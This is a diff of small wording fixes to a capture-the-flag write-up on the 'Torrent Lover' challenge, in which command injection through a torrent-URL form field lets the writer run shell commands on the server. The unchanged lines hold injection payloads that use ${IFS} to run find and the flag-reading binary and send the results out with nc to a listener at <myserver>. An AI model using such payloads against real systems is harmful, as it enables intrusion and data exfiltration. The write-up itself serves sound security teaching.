@@ -1,7 +1,7 @@
 Torrent Lover
 -------------
 
-In this problem, we were given a website with a form and the instructions: "input something(torrent)'s URL u wanna know here". If you entered a link with a torrent file, the website would direct you to a page where you could view metadata about the torrent. The server performed some kind of validation on the url you gave it. Entering a url with a space, or aurl that didn't end in ".torrent" would give you an error message.
+In this problem, we were given a website with a form and the instructions: "input something(torrent)'s URL u wanna know here". If you entered a link with a torrent file, the website would direct you to a page where you could view metadata about the torrent. The server performed some kind of validation on the url you gave it. Entering a url with a space, or a url that didn't end in ".torrent" would give you an error message.
 
 ### Unsafe wget
 
@@ -31,7 +31,7 @@ Caused the game server to send me the word "test". This means we can run arbitra
 
 ### Find the flag
 
-First things first, I used the `find` command to file the flag on the server
+First things first, I used the `find` command to look for the flag on the server
 ```
 http://<myserver>/somefile;find${IFS}/${IFS}-name${IFS}*flag*|nc${IFS}<myserver>${IFS}9999;.torrent
 ```
@@ -42,7 +42,7 @@ Running the binary by submitting this url
 ```
 http://<myserver>;/var/www/flag/use_me_to_read_flag${IFS}/var/www/flag/flag|nc${IFS}<myserver>${IFS}9999;.torrent
 ```
-I see a message that says: `You do not have permission to access /var/www/flag/flag` Using ls -al to inspect the permissions, it appears that
+I see a message that says: `You do not have permission to access /var/www/flag/flag` Using `ls -al` to inspect the permissions, it appears that
 the binary does have the proper permissions to read the flag. We probably want to grab the binary and inspect it locally.
 
 ### A small bit of reverse engineering
@@ -59,14 +59,14 @@ nc -l 9999 > out.bin
 
 Binary get!
 
-Using `file`, I determine that it is an ELF. I run `ltrace` on it.
+Using `file`, I determine that it is an ELF. I run `ltrace` on it:
 
 ```
 echo "test" > flag
 ltrace out.bin flag
 ```
 
-From the output, I can see that the binary does a `strstr` so see if the argument I provided contains the substring 'flag'.
+From the output, I can see that the binary does a `strstr` to see if the argument I provided contains the substring 'flag'.
 
 So we can't directly read the flag, but that's no big deal. We can just make a symlink to the flag.
 
